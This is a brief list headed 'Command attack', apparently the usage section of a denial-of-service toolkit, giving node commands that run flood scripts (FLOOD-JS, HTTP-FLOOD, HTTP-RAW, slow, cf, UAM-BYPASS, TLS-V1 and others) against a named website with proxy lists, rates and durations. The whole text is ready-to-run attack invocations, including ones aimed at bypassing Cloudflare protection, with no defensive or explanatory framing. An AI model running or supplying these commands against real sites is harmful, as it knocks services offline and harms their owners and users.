Command attack :


FLOOD-JS : node FLOOD-JS.js https://sex.com proxy.txt 180 GET


node HTTP-BROWSER.js https://sex.com 1000 180


node cf.js https://sex.com 180


node HTTP-FLOOD.js https://sex.com 180


node HTTPGET.js https://sex.com 443 180


node hyper.js https://sex.com 180


node HTTP-RAW.js https://sex.com 180


node slow.js https://sex.com 180


node UAM-BYPASS.js https://sex.com 180 120



node TLS-V1.js https://sex.com 60 150
